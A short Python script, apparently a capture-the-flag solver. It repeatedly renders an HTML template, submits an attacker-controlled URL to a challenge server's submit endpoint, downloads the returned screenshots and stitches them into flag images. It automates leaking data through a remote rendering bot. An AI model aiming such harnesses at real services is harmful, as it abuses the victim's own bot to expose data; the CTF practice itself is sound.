from jinja2 import Template
from bs4 import BeautifulSoup

import requests
import os

HOST = "http://3.113.172.41:26478/"
# HOST = "http://0.0.0.0:8000/"

html = Template(open("./index.html.jinja2").read())

for idx in range(13):
    with open("./index.html", "w") as f:
        f.write(html.render(idx=450+90*idx))

    r = requests.get(HOST + "/submit?url=http%3A%2F%2FMON-IP%3AMON-PORT%2F")
    soup = BeautifulSoup(r.text, "html.parser")

    img = requests.get(HOST + soup.find(id="msg").a["href"])
    with open("img/{:02d}.png".format(idx), "wb") as f:
        f.write(img.content)

    print(idx)

os.system("bash -c 'convert img/{00..06}.png +append img/flag-0.png'")
os.system("bash -c 'convert img/{07..12}.png +append img/flag-1.png'")
